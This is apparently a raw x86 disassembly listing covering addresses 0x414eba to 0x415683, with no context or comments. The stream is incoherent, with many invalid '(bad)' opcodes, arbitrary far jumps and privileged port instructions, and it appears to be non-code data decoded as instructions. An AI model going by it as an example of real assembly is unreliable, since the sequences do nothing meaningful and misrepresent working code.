  414eba:	add    DWORD PTR [eax+0x75],ebp
  414ebd:	mov    cl,0x3a
  414ebf:	in     eax,0x88
  414ec1:	sbb    ebx,ecx
  414ec3:	idiv   BYTE PTR [edi-0x14]
  414ec6:	sbb    al,0xf2
  414ec8:	lock int 0xce
  414ecb:	or     BYTE PTR [edi],dl
  414ecd:	dec    esp
  414ece:	ins    DWORD PTR es:[edi],dx
  414ecf:	push   edi
  414ed0:	mov    bh,0x7f
  414ed2:	jb     0x414eed
  414ed4:	das    
  414ed5:	adc    DWORD PTR [edi],edi
  414ed7:	aam    0x19
  414ed9:	xor    BYTE PTR [ecx+0x65c0611f],0xb0
  414ee0:	mov    dl,BYTE PTR [ebp-0x13]
  414ee3:	xchg   DWORD PTR [ebp+0x24f3a2e5],esi
  414ee9:	sbb    bl,bl
  414eeb:	mov    esi,0x2a90dbd8
  414ef0:	cs scas al,BYTE PTR es:[edi]
  414ef2:	fidivr DWORD PTR [ebx-0x5eeb3561]
  414ef8:	jmp    0xe5e6:0xd0552ba2
  414eff:	mov    dh,0x59
  414f01:	jno    0x414e8d
  414f03:	les    edx,FWORD PTR [eax]
  414f05:	shl    BYTE PTR [esi+edx*8-0x1a85c263],0x35
  414f0d:	pop    eax
  414f0e:	sbb    al,0x10
  414f10:	or     eax,0xc822e5b8
  414f15:	jmp    0x7b07fcf3
  414f1a:	cmc    
  414f1b:	or     ebp,0x4b
  414f1e:	inc    ebx
  414f1f:	lods   eax,DWORD PTR ds:[esi]
  414f20:	pop    edi
  414f21:	cli    
  414f22:	inc    ecx
  414f23:	push   ecx
  414f24:	stos   BYTE PTR es:[edi],al
  414f25:	stc    
  414f26:	dec    eax
  414f27:	je     0x414ee9
  414f29:	dec    edx
  414f2a:	mov    bh,0x52
  414f2c:	sbb    ecx,DWORD PTR [ecx]
  414f2e:	aaa    
  414f2f:	mov    ecx,0xa424525f
  414f34:	jp     0x414f53
  414f36:	int3   
  414f37:	mov    al,BYTE PTR [edx]
  414f39:	enter  0x62c,0xfb
  414f3d:	add    al,BYTE PTR [eax-0x22a85317]
  414f43:	adc    DWORD PTR [ecx+ebp*4+0x3],eax
  414f47:	sbb    DWORD PTR [ebp-0x4f5f2d],esp
  414f4d:	cmp    bh,BYTE PTR [ecx]
  414f4f:	ss call 0x4c0f:0x227e715d
  414f57:	imul   esp,DWORD PTR [edx+0x62642649],0xe88b07df
  414f61:	test   al,0xb9
  414f63:	sbb    BYTE PTR [edx],0x42
  414f66:	sti    
  414f67:	sub    DWORD PTR [ebp+0x55cb2753],esi
  414f6d:	or     bl,BYTE PTR [edi]
  414f6f:	mov    ?,WORD PTR [ebx]
  414f71:	cmp    ecx,ebp
  414f73:	(bad)  
  414f74:	jnp    0x414f80
  414f76:	and    al,0x72
  414f78:	outs   dx,DWORD PTR ds:[esi]
  414f79:	(bad)  
  414f7b:	or     BYTE PTR [ebx],ch
  414f7d:	aas    
  414f7e:	test   DWORD PTR [edx],esi
  414f80:	cs jb  0x414f29
  414f83:	sti    
  414f84:	add    BYTE PTR [edx-0x166973ff],0x83
  414f8b:	cmp    dl,BYTE PTR [ebx-0x4421da2b]
  414f91:	(bad)  
  414f92:	gs out dx,eax
  414f94:	xor    esi,DWORD PTR [esi+edi*2-0x3b3caf8a]
  414f9b:	(bad)  
  414f9c:	neg    BYTE PTR [ecx+0xcc2f46d]
  414fa2:	add    ch,BYTE PTR [eax-0x3]
  414fa5:	outs   dx,DWORD PTR ds:[esi]
  414fa6:	das    
  414fa7:	or     bh,BYTE PTR [ecx-0x45b17991]
  414fad:	fcompp 
  414faf:	mov    DWORD PTR [edi],edi
  414fb1:	ja     0x414f73
  414fb3:	xchg   esp,eax
  414fb4:	lods   eax,DWORD PTR ds:[esi]
  414fb5:	xor    DWORD PTR [ecx-0x2df29b3b],0x9a1ed86b
  414fbf:	arpl   bx,bp
  414fc1:	dec    ecx
  414fc2:	jmp    DWORD PTR [eax]
  414fc4:	neg    DWORD PTR [edi+esi*2]
  414fc7:	jb     0x415039
  414fc9:	arpl   WORD PTR [edx+0x22f4e431],di
  414fcf:	stc    
  414fd0:	sub    bh,ch
  414fd2:	or     dl,cl
  414fd4:	ins    DWORD PTR es:[edi],dx
  414fd5:	imul   BYTE PTR [ecx+0x12a8394]
  414fdb:	sub    esi,0x5759963f
  414fe1:	loopne 0x414f79
  414fe3:	inc    ecx
  414fe4:	enter  0xe773,0x17
  414fe8:	test   BYTE PTR [eax-0xbdf442d],bh
  414fee:	mov    esp,0x6f935392
  414ff3:	cmpps  xmm2,xmm7,0x36
  414ff7:	aad    0x6b
  414ff9:	scas   eax,DWORD PTR es:[edi]
  414ffa:	or     dl,BYTE PTR [ebp-0x5acf8ef3]
  415000:	rcr    BYTE PTR ds:0x338aed19,cl
  415006:	test   eax,0xd7febebb
  41500b:	and    BYTE PTR [esi-0x51],ch
  41500e:	jl     0x414fa3
  415010:	cmc    
  415011:	sbb    eax,0x74e6181a
  415016:	mov    esi,0x6f54a685
  41501b:	dec    ecx
  41501c:	push   esp
  41501d:	adc    ah,BYTE PTR [edi+0x273372e6]
  415023:	inc    edx
  415024:	or     DWORD PTR [edx+0x24],edi
  415027:	pop    ds
  415028:	sbb    al,BYTE PTR [ebx*1+0x1203e1b3]
  41502f:	js     0x415012
  415031:	(bad)  
  415032:	mov    ds:0xac52b8f4,al
  415037:	dec    esi
  415038:	pop    ecx
  415039:	mov    ds:0xe8cc485f,eax
  41503e:	pop    eax
  41503f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415040:	(bad)  
  415041:	pop    edi
  415042:	ja     0x414fcc
  415044:	jge    0x4150a6
  415046:	repz fisttp QWORD PTR [esi]
  415049:	add    bl,BYTE PTR [ecx-0x18a9155]
  41504f:	add    esi,ebp
  415051:	sbb    al,0xd1
  415053:	pop    esi
  415054:	icebp  
  415055:	or     BYTE PTR [eax-0xb5f0102],bh
  41505b:	pop    ebp
  41505c:	or     al,0x2e
  41505e:	(bad)  
  41505f:	pop    edi
  415060:	daa    
  415061:	and    DWORD PTR [esi-0x1c8bf683],ecx
  415067:	aad    0x60
  415069:	mov    edx,edi
  41506b:	sub    DWORD PTR [edx-0x17dc4f28],esi
  415071:	dec    ebx
  415072:	in     al,0xfc
  415074:	shl    BYTE PTR [esi],1
  415076:	jmp    0x6ee5cf7d
  41507b:	mov    bl,BYTE PTR ds:0xa1b0af1
  415081:	nop
  415082:	cmp    ah,BYTE PTR [esi+0x4f0a6a60]
  415088:	sbb    eax,0xd74280de
  41508d:	inc    esi
  41508e:	jg     0x41507d
  415090:	pop    edx
  415091:	cmp    DWORD PTR [esi-0x6a2386f7],ebp
  415097:	scas   eax,DWORD PTR es:[edi]
  415098:	adc    BYTE PTR [esi+esi*2],0x9
  41509c:	dec    eax
  41509d:	out    0xf7,al
  41509f:	ins    DWORD PTR es:[edi],dx
  4150a0:	pop    esp
  4150a1:	xor    BYTE PTR [ecx+0x3a],cl
  4150a4:	imul   esi,DWORD PTR [ecx-0x2410c683],0x45943fec
  4150ae:	lock cwde 
  4150b0:	adc    BYTE PTR [ecx],al
  4150b2:	aam    0x32
  4150b4:	out    0x51,eax
  4150b6:	push   0xe2a21bf9
  4150bb:	aam    0x31
  4150bd:	call   0x294d:0x94815f91
  4150c4:	sbb    bl,BYTE PTR [esi-0xb523c12]
  4150ca:	pop    eax
  4150cb:	cmp    eax,0x570c867d
  4150d0:	sbb    al,0x4b
  4150d2:	mov    cl,0x72
  4150d4:	test   bl,bh
  4150d6:	mov    ah,0x29
  4150d8:	mov    eax,ebx
  4150da:	pop    esp
  4150db:	std    
  4150dc:	jae    0x41511b
  4150de:	je     0x41506d
  4150e0:	lahf   
  4150e1:	pusha  
  4150e2:	test   eax,0xc1bf05a4
  4150e7:	mov    ecx,0x60fe2008
  4150ec:	jo     0x415151
  4150ee:	les    ecx,FWORD PTR [ebx+0x51d36e69]
  4150f4:	(bad)  [ebx-0x27]
  4150f7:	mov    cl,BYTE PTR [edx]
  4150f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150fa:	gs cmp cl,ch
  4150fd:	out    0xc0,eax
  4150ff:	cld    
  415100:	xchg   edi,eax
  415101:	test   al,0x25
  415103:	push   ebx
  415104:	mov    cl,0x11
  415106:	jns    0x4150b7
  415108:	lods   eax,DWORD PTR ds:[esi]
  415109:	iret   
  41510a:	jnp    0x415171
  41510c:	mov    dh,0x1
  41510e:	js     0x415124
  415110:	(bad)  
  415111:	scas   al,BYTE PTR es:[edi]
  415112:	sar    eax,1
  415114:	mov    ch,0x18
  415116:	mov    dh,BYTE PTR ds:0xf9eb56f1
  41511c:	mov    ?,WORD PTR [ecx+0x11]
  41511f:	mov    ebp,0x64d378b4
  415124:	and    al,0x5e
  415126:	loope  0x415106
  415128:	jae    0x415164
  41512a:	mov    ah,0xa6
  41512c:	aas    
  41512d:	sub    eax,0x14cc0253
  415132:	xchg   edx,eax
  415133:	push   ebp
  415134:	outs   dx,DWORD PTR ds:[esi]
  415135:	push   ss
  415136:	mov    ebx,0x5f99793c
  41513b:	xchg   ecx,eax
  41513c:	or     dl,BYTE PTR [ecx+0x2]
  41513f:	call   DWORD PTR [ebp-0x3ad3340a]
  415145:	mov    ch,0x53
  415147:	les    edi,FWORD PTR [edx+0x1d]
  41514a:	xchg   ebp,eax
  41514b:	and    eax,0x5c226719
  415150:	inc    esi
  415151:	ins    DWORD PTR es:[edi],dx
  415152:	xchg   ebp,eax
  415153:	jmp    0x7159:0xa7237b2e
  41515a:	mov    DWORD PTR [edi],esp
  41515c:	out    0xfd,eax
  41515e:	mov    al,0x37
  415160:	sbb    eax,ebp
  415162:	cmp    BYTE PTR [edi+ecx*4],ah
  415165:	test   al,0x82
  415167:	fsubr  DWORD PTR [edi-0x30]
  41516a:	imul   esp,DWORD PTR [esi+0x3e],0x0
  41516e:	sahf   
  41516f:	sbb    al,0xf1
  415171:	rcr    DWORD PTR [eax+ebp*1-0xdd1d9a1],0x32
  415179:	sbb    esp,DWORD PTR [ebx-0x7874adbb]
  41517f:	adc    DWORD PTR [ecx-0x77],0xdd22ce7b
  415186:	fsubr  QWORD PTR [edi-0x3dfea1fc]
  41518c:	cmp    al,BYTE PTR [ecx]
  41518e:	inc    ebp
  41518f:	sti    
  415190:	jb     0x4151ee
  415192:	pop    esp
  415193:	pop    edx
  415194:	clc    
  415195:	enter  0xc716,0x64
  415199:	jb     0x4151c4
  41519b:	outs   dx,BYTE PTR ds:[esi]
  41519c:	sahf   
  41519d:	mov    BYTE PTR [ebx+0x75],bl
  4151a0:	mov    edi,0x63512c80
  4151a5:	call   0x1bc997ee
  4151aa:	jae    0x4151b8
  4151ac:	stos   BYTE PTR es:[edi],al
  4151ad:	call   0xd911296b
  4151b2:	ficomp WORD PTR [eax-0x91a382a]
  4151b8:	and    esp,ebp
  4151ba:	or     esp,DWORD PTR [ebx+0x76]
  4151bd:	pop    esp
  4151be:	cdq    
  4151bf:	mov    al,0x6b
  4151c1:	bound  ebx,QWORD PTR [edi+0x0]
  4151c4:	lods   eax,DWORD PTR ds:[esi]
  4151c5:	test   edi,ecx
  4151c7:	(bad)  
  4151c8:	std    
  4151c9:	outs   dx,BYTE PTR ds:[esi]
  4151ca:	dec    ebx
  4151cb:	(bad)  
  4151cc:	sti    
  4151cd:	jbe    0x41524e
  4151cf:	daa    
  4151d0:	test   eax,0xae826b79
  4151d5:	jbe    0x4151e7
  4151d7:	aaa    
  4151d8:	pop    esp
  4151d9:	pusha  
  4151da:	pop    edx
  4151db:	mov    eax,0xb747622e
  4151e0:	cld    
  4151e1:	fdivr  QWORD PTR [eax-0x30e43302]
  4151e7:	lods   al,BYTE PTR ds:[esi]
  4151e8:	ror    DWORD PTR [eax-0x3cf59cbd],1
  4151ee:	mov    al,0xac
  4151f0:	dec    ebp
  4151f1:	popf   
  4151f2:	cwde   
  4151f3:	sbb    BYTE PTR [esi+0x2a6c49a3],0x91
  4151fa:	sbb    DWORD PTR gs:[ebx-0x43],esp
  4151fe:	jnp    0x41527f
  415200:	inc    esi
  415201:	jle    0x415185
  415203:	mov    al,0xb7
  415205:	icebp  
  415206:	pop    eax
  415207:	imul   eax,DWORD PTR [eax-0x16],0xff265cf2
  41520e:	ins    DWORD PTR es:[edi],dx
  41520f:	sar    BYTE PTR [edi+ecx*4+0x5a757b4c],1
  415216:	js     0x415244
  415218:	in     eax,dx
  415219:	cs std 
  41521b:	push   DWORD PTR [edx+0x19604f97]
  415221:	fcom   st(5)
  415223:	and    BYTE PTR [eax+ebp*2-0x9],ch
  415227:	(bad)  [eax]
  415229:	es lods eax,DWORD PTR ss:[esi]
  41522c:	stc    
  41522d:	ds push eax
  41522f:	push   es
  415230:	mov    al,0xb0
  415232:	repz sub dh,BYTE PTR [esi]
  415235:	shl    BYTE PTR [eax+0x22f41ccb],cl
  41523b:	adc    eax,0xd060fdcb
  415240:	mov    bl,0x11
  415242:	jnp    0x415268
  415244:	rcr    DWORD PTR [ecx-0x3a],0x2a
  415248:	add    esi,edx
  41524a:	les    esp,FWORD PTR [edx-0x76]
  41524d:	fs inc esi
  41524f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415250:	and    DWORD PTR [edi-0x7d],esp
  415253:	dec    esp
  415254:	inc    esp
  415255:	xor    ebx,ecx
  415257:	push   0xffffffe7
  415259:	outs   dx,BYTE PTR ds:[esi]
  41525a:	ins    DWORD PTR es:[edi],dx
  41525b:	sub    bh,ah
  41525d:	inc    edx
  41525e:	push   ds
  41525f:	aaa    
  415260:	loope  0x41522a
  415262:	aad    0x88
  415264:	xchg   ebp,ecx
  415266:	mov    edi,0x1adc60b6
  41526b:	aam    0x1f
  41526d:	push   edx
  41526e:	repnz pushf 
  415270:	and    eax,0x3cc5ed81
  415275:	xor    eax,0xaf394a5e
  41527a:	inc    esi
  41527b:	ret    0x7fc4
  41527e:	sub    al,cl
  415280:	cld    
  415281:	sbb    edi,DWORD PTR [edx+0x43]
  415284:	aad    0xb7
  415286:	jnp    0x41523b
  415288:	lods   eax,DWORD PTR ds:[esi]
  415289:	xor    ecx,DWORD PTR [ebx+0x34]
  41528c:	(bad)  
  41528d:	jb     0x4152e6
  41528f:	lods   al,BYTE PTR ds:[esi]
  415290:	dec    ebp
  415291:	shr    DWORD PTR [ecx],cl
  415293:	xor    al,0x72
  415295:	xor    esp,DWORD PTR es:[esi+0x68af7b9e]
  41529c:	out    0xe4,al
  41529e:	mov    ds:0xa58d73a9,al
  4152a3:	repnz cmp eax,0x545b0e42
  4152a9:	repz out dx,al
  4152ab:	ds pop eax
  4152ad:	stos   BYTE PTR es:[edi],al
  4152ae:	xchg   esi,eax
  4152af:	xor    edi,ecx
  4152b1:	adc    ecx,DWORD PTR [esi+0x5d9d7272]
  4152b7:	loopne 0x4152fb
  4152b9:	mov    bh,0x31
  4152bb:	fmul   QWORD PTR [ebx]
  4152bd:	stc    
  4152be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152bf:	mov    ebp,0x75ea35f9
  4152c4:	retf   
  4152c5:	dec    bx
  4152c7:	inc    ebp
  4152c8:	cmp    eax,0x38495102
  4152cd:	add    DWORD PTR [eax-0x1e],edx
  4152d0:	push   ss
  4152d1:	sbb    DWORD PTR fs:[esi+ebp*2],edi
  4152d5:	repnz or BYTE PTR [esi+edx*1],0x55
  4152da:	sub    eax,0x2d2c544b
  4152df:	jmp    0x6815:0x85c12b93
  4152e6:	mov    dl,BYTE PTR [eax+0x29]
  4152e9:	lods   al,BYTE PTR ds:[esi]
  4152ea:	inc    ecx
  4152eb:	sbb    edi,DWORD PTR [edi-0x1c796af0]
  4152f1:	mov    ebx,0x8626c99e
  4152f6:	fnstenv [edx+0x4f7eeee4]
  4152fc:	inc    eax
  4152fd:	test   BYTE PTR ss:[esi+eax*2],al
  415301:	cdq    
  415302:	sbb    DWORD PTR [ebx],esi
  415304:	jne    0x415312
  415306:	mov    al,ds:0x7167cb16
  41530b:	inc    ecx
  41530c:	sub    eax,0x2f4627c6
  415311:	or     esp,DWORD PTR [ebx]
  415313:	retf   0xd106
  415316:	in     al,dx
  415317:	scas   al,BYTE PTR es:[edi]
  415318:	sbb    BYTE PTR [esi],bh
  41531a:	sbb    eax,0x9c140f43
  41531f:	sbb    al,ah
  415321:	adc    BYTE PTR [ecx+0x5c],bl
  415324:	or     DWORD PTR [edi+0x5967112e],eax
  41532a:	mov    eax,0x86b893a1
  41532f:	sahf   
  415330:	xor    esp,DWORD PTR [edi+0x741104fa]
  415336:	or     eax,0xdfdcc50
  41533b:	inc    ebp
  41533c:	jo     0x415328
  41533e:	shld   edx,ecx,0x1e
  415342:	out    0x53,al
  415344:	inc    ecx
  415345:	xlat   BYTE PTR ds:[ebx]
  415346:	lods   eax,DWORD PTR ds:[esi]
  415347:	cmp    dh,bh
  415349:	fwait
  41534a:	sbb    bl,BYTE PTR [eax-0x74]
  41534d:	sahf   
  41534e:	or     edx,DWORD PTR ss:[eax+0x63]
  415352:	repz aas 
  415354:	fnsetpm(287 only) 
  415356:	mov    edx,DWORD PTR [edi+0x75]
  415359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41535a:	xchg   edi,eax
  41535b:	sub    DWORD PTR [ebp-0x7a],esi
  41535e:	inc    esi
  41535f:	push   edi
  415360:	push   0x6a
  415362:	out    0x10,eax
  415364:	mov    ds:0x72616c8e,al
  415369:	call   0x942:0x42ac1494
  415370:	call   0x761b:0x508da0f5
  415377:	outs   dx,DWORD PTR ds:[esi]
  415378:	xor    eax,0x38d24f98
  41537d:	fstp   TBYTE PTR [ebp-0x6]
  415380:	mov    WORD PTR [ebp-0x5e],ds
  415383:	sbb    al,0x1a
  415385:	mov    BYTE PTR [edi],bl
  415387:	add    DWORD PTR [esi],ebx
  415389:	xor    bl,0x29
  41538c:	fdivr  st(7),st
  41538e:	jne    0x4153ce
  415390:	and    ecx,ebx
  415392:	fiadd  WORD PTR [ebx+0x66]
  415395:	mov    ds:0xe40c88f1,eax
  41539a:	out    0xb5,al
  41539c:	add    DWORD PTR [edi+0x3ab2bbf9],ecx
  4153a2:	adc    eax,0xb7ca6d32
  4153a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a8:	dec    eax
  4153a9:	push   cs
  4153aa:	inc    ebx
  4153ab:	xchg   BYTE PTR [ebp-0xdf1b8a0],ah
  4153b1:	inc    DWORD PTR [edx-0x16]
  4153b4:	dec    esp
  4153b5:	xchg   ecx,eax
  4153b6:	fdivr  DWORD PTR ds:0x10137701
  4153bc:	cmp    bl,al
  4153be:	fcomip st,st(7)
  4153c0:	cli    
  4153c1:	hlt    
  4153c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c3:	(bad)  
  4153c4:	retf   0xec08
  4153c7:	mov    al,ds:0x673a17ab
  4153cc:	cdq    
  4153cd:	xchg   ebx,eax
  4153ce:	pop    ss
  4153cf:	and    bl,dl
  4153d1:	fwait
  4153d2:	pop    eax
  4153d3:	retf   0x43bb
  4153d6:	xchg   DWORD PTR [eax],ecx
  4153d8:	out    0xbc,eax
  4153da:	loop   0x415377
  4153dc:	mov    bh,0xf8
  4153de:	sbb    ecx,esi
  4153e0:	les    edx,FWORD PTR [edi+0x38df7b22]
  4153e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153e7:	cmp    DWORD PTR [esi-0x24],ecx
  4153ea:	mov    eax,0x295bfa2a
  4153ef:	sub    DWORD PTR [esi+0x286cb853],esi
  4153f5:	outs   dx,BYTE PTR ds:[esi]
  4153f6:	and    al,0xe1
  4153f8:	clc    
  4153f9:	outs   dx,DWORD PTR ds:[esi]
  4153fa:	inc    ebx
  4153fb:	push   edx
  4153fc:	push   es
  4153fd:	mov    al,ds:0xcdd94c83
  415402:	setp   BYTE PTR [esi-0xa929b32]
  415409:	fdiv   QWORD PTR [ebx-0x6a]
  41540c:	adc    DWORD PTR [ecx+0xc17eaf8],esi
  415412:	in     eax,0x3d
  415414:	cld    
  415415:	inc    ebp
  415416:	enter  0xf134,0xd7
  41541a:	mov    BYTE PTR [eax+0x3b7e06c3],al
  415420:	pop    edx
  415421:	cmp    esi,esp
  415423:	rol    DWORD PTR [edi-0x7964c0c],cl
  415429:	inc    eax
  41542a:	pop    eax
  41542b:	shl    ebp,1
  41542d:	(bad)  
  41542e:	cmp    BYTE PTR [edx+edi*2],bh
  415431:	dec    ebx
  415432:	fs dec ebx
  415434:	adc    al,0xec
  415436:	xchg   dh,al
  415438:	adc    al,0xda
  41543a:	ret    
  41543b:	clc    
  41543c:	cmp    eax,0x8afeb12
  415441:	shr    BYTE PTR [ecx-0x72],0xf
  415445:	xor    dh,BYTE PTR [edx+edi*1]
  415448:	xchg   ebx,eax
  415449:	jmp    0x64fa:0x69235795
  415450:	in     eax,dx
  415451:	fsub   DWORD PTR [esi+eax*2-0x2681a9f2]
  415458:	inc    esi
  415459:	sub    eax,0xa18d8f85
  41545e:	push   esi
  41545f:	inc    ebp
  415460:	sub    esp,ecx
  415462:	test   DWORD PTR [eax-0x8],edi
  415465:	cmp    eax,0xf2a6c6f5
  41546a:	sbb    bl,dl
  41546c:	mov    edx,0x7b960613
  415471:	xor    ebx,DWORD PTR [ebp-0xb]
  415474:	shr    ebp,0xc4
  415477:	mov    cl,0x28
  415479:	push   ebp
  41547a:	mov    esi,0x90f5377a
  41547f:	iret   
  415480:	push   esp
  415481:	inc    esi
  415482:	dec    ebx
  415483:	out    dx,al
  415484:	jbe    0x4154a3
  415486:	push   ds
  415487:	cmp    bh,BYTE PTR [eax]
  415489:	test   BYTE PTR [ebx],dh
  41548b:	test   cl,ch
  41548d:	inc    esp
  41548e:	dec    ebx
  41548f:	fld    TBYTE PTR [esi+edi*1+0x3]
  415493:	pop    ds
  415494:	mov    esp,0x3dac79b6
  415499:	frstor [ebx+0x10]
  41549c:	jg     0x41544e
  41549e:	ins    DWORD PTR es:[edi],dx
  41549f:	jmp    0x4189fc9d
  4154a4:	jmp    0x1139:0xc0b8df06
  4154ab:	ss scas al,BYTE PTR es:[edi]
  4154ad:	clc    
  4154ae:	push   esi
  4154af:	daa    
  4154b0:	mov    ?,WORD PTR ds:0x9ba330dc
  4154b6:	jp     0x415513
  4154b8:	repz aaa 
  4154ba:	push   ecx
  4154bb:	call   0xc043:0x77839eac
  4154c2:	jg     0x415462
  4154c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154c5:	adc    DWORD PTR [ecx-0x77],ecx
  4154c8:	or     al,0x2f
  4154ca:	out    0x2b,al
  4154cc:	mov    edx,0x68a34e47
  4154d1:	leave  
  4154d2:	loop   0x4154a5
  4154d4:	shl    edi,1
  4154d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d7:	mov    cl,0x9e
  4154d9:	pop    ss
  4154da:	(bad)  
  4154db:	and    DWORD PTR [ecx],eax
  4154dd:	cs jb  0x4154e2
  4154e0:	cmp    ch,BYTE PTR [ecx]
  4154e2:	mov    ch,0x72
  4154e4:	aam    0x7f
  4154e6:	push   ds
  4154e7:	mov    edi,0x433bc760
  4154ec:	xchg   edx,eax
  4154ed:	loop   0x41555a
  4154ef:	adc    esp,ebx
  4154f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154f2:	shr    DWORD PTR [ebp-0x3f],1
  4154f5:	sbb    edi,0x30
  4154f8:	inc    ebx
  4154f9:	outs   dx,DWORD PTR ds:[esi]
  4154fa:	push   ecx
  4154fb:	inc    edi
  4154fc:	dec    edx
  4154fd:	add    eax,DWORD PTR [ecx-0x35]
  415500:	in     eax,dx
  415501:	iret   
  415502:	fmul   st(0),st
  415504:	(bad)  
  415506:	mov    DWORD PTR [edi],ebp
  415508:	call   0x7b63d7f3
  41550d:	dec    ebp
  41550e:	test   BYTE PTR [eax],dh
  415510:	pushf  
  415511:	jbe    0x41553c
  415513:	cmp    eax,0xc60a48d4
  415518:	push   ebx
  415519:	nop
  41551a:	inc    ecx
  41551b:	daa    
  41551c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41551d:	cdq    
  41551e:	pop    ebp
  41551f:	pushf  
  415520:	addr16 add al,0x2
  415523:	xchg   edx,eax
  415524:	inc    eax
  415525:	cli    
  415526:	fistp  QWORD PTR [eax-0x51]
  415529:	lods   al,BYTE PTR ds:[esi]
  41552a:	call   0xcd8626b4
  41552f:	pop    sp
  415531:	mov    cl,0x41
  415533:	push   esp
  415534:	int3   
  415535:	mov    bh,0x7a
  415537:	(bad)
  41553b:	clc    
  41553c:	and    eax,0x1939f895
  415541:	gs cwde 
  415543:	push   0xffffffcf
  415545:	xor    al,0xb
  415547:	mov    ds:0x52b484bc,eax
  41554c:	scas   eax,DWORD PTR es:[edi]
  41554d:	add    cl,BYTE PTR [esp+edx*2]
  415550:	scas   eax,DWORD PTR es:[edi]
  415551:	push   0x8b0c82ca
  415556:	int    0xeb
  415558:	jp     0x41550d
  41555a:	dec    edx
  41555b:	dec    ecx
  41555c:	jmp    0x3c61d856
  415561:	div    BYTE PTR [eax]
  415563:	call   0x52e0:0xb02f2e18
  41556a:	inc    ebx
  41556b:	mov    al,0x9b
  41556d:	jns    0x4155de
  41556f:	mov    ?,WORD PTR [ebp+0x55]
  415572:	fnstenv [ebx+0x36]
  415575:	ret    0xe267
  415578:	test   DWORD PTR [ebp-0x562bcd77],edi
  41557e:	jnp    0x415565
  415580:	cwde   
  415581:	pushf  
  415582:	nop
  415583:	dec    esp
  415584:	mov    BYTE PTR [ecx+0x1b],bh
  415587:	inc    esp
  415588:	dec    DWORD PTR [ebp+0x330e6992]
  41558e:	scas   eax,DWORD PTR es:[edi]
  41558f:	mov    edx,ecx
  415591:	xlat   BYTE PTR ds:[ebx]
  415592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415593:	outs   dx,DWORD PTR ds:[esi]
  415594:	sbb    al,0x11
  415596:	xor    cl,BYTE PTR [ebx+0x2e9abe78]
  41559c:	aad    0x71
  41559e:	mov    edx,0x5e18fde7
  4155a3:	arpl   WORD PTR [edi-0x7e],cx
  4155a6:	inc    eax
  4155a7:	not    BYTE PTR [esi+0x7653849c]
  4155ad:	xchg   DWORD PTR [edx+0x1a8953b0],ecx
  4155b3:	cld    
  4155b4:	xchg   edx,eax
  4155b5:	imul   edx,DWORD PTR [ecx+ebx*2],0x5b6ae23d
  4155bc:	outs   dx,BYTE PTR ds:[esi]
  4155bd:	mov    esp,DWORD PTR ds:0xc89f2054
  4155c3:	idiv   DWORD PTR [edi+0x461daeef]
  4155c9:	mov    eax,ds:0x4e533716
  4155ce:	mov    eax,ds:0xf7117e3
  4155d3:	mov    al,ds:0xd0f34916
  4155d8:	xor    ebp,eax
  4155da:	bound  edx,QWORD PTR [eax]
  4155dc:	jecxz  0x4155ab
  4155de:	xchg   bh,ch
  4155e0:	xchg   ebp,eax
  4155e1:	mov    edi,0x1c4d43d6
  4155e6:	sbb    dl,BYTE PTR [edx-0x6d]
  4155e9:	stos   DWORD PTR es:[edi],eax
  4155ea:	xchg   DWORD PTR [edi],esp
  4155ec:	out    0xa,al
  4155ee:	not    BYTE PTR [edi]
  4155f0:	xchg   edi,eax
  4155f1:	sub    bh,BYTE PTR [edx+0x2f]
  4155f4:	imul   eax,edx,0xffffffbd
  4155f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155f8:	dec    edi
  4155f9:	jle    0x4155ca
  4155fb:	sbb    al,BYTE PTR [ecx]
  4155fd:	mov    esi,0xc4634c12
  415602:	popf   
  415603:	outs   dx,BYTE PTR ds:[esi]
  415604:	repnz mov BYTE PTR [eax],al
  415607:	outs   dx,DWORD PTR ds:[esi]
  415608:	jmp    0x4155af
  41560a:	jo     0x4155ee
  41560c:	add    eax,0x6ceeed27
  415611:	inc    edi
  415612:	mov    bl,0xe5
  415614:	clc    
  415615:	dec    edi
  415616:	add    ebp,DWORD PTR [ecx+eiz*8+0x37239e9e]
  41561d:	adc    BYTE PTR [ebp-0x5f],ch
  415620:	pushf  
  415621:	stos   BYTE PTR es:[edi],al
  415622:	pusha  
  415623:	popa   
  415624:	mov    esp,0x908c892d
  415629:	ror    BYTE PTR [ecx],0xb8
  41562c:	pop    ebp
  41562d:	xor    DWORD PTR [eax],edx
  41562f:	cs jge 0x415650
  415632:	cli    
  415633:	fild   WORD PTR [eax]
  415635:	adc    dl,BYTE PTR [esi+0x44]
  415638:	or     al,0xbd
  41563a:	pop    ds
  41563b:	in     al,dx
  41563c:	pop    ds
  41563d:	inc    eax
  41563e:	sbb    ecx,DWORD PTR [edi-0x2d]
  415641:	push   ebx
  415642:	aas    
  415643:	ins    DWORD PTR es:[edi],dx
  415644:	sub    dh,0x35
  415647:	add    BYTE PTR [edx-0x8],ah
  41564a:	jle    0x4155ff
  41564c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41564d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41564e:	pop    ecx
  41564f:	ret    0x8c2a
  415652:	and    edx,DWORD PTR [ebp+0x457b2655]
  415658:	or     DWORD PTR [esi-0x2016bde],ebx
  41565e:	sar    BYTE PTR [ebp+0x306f0408],0x90
  415665:	inc    edi
  415666:	push   edx
  415667:	hlt    
  415668:	add    BYTE PTR [eax-0xa],al
  41566b:	shr    BYTE PTR [esi+0xf],1
  41566e:	imul   ebp,DWORD PTR [esi+0x7f],0x57438b27
  415675:	mov    al,0x79
  415677:	jae    0x415622
  415679:	sbb    al,0x50
  41567b:	ja     0x4156f1
  41567d:	shr    BYTE PTR ds:0x3299b12e,1
  415683:	jle    0x415669
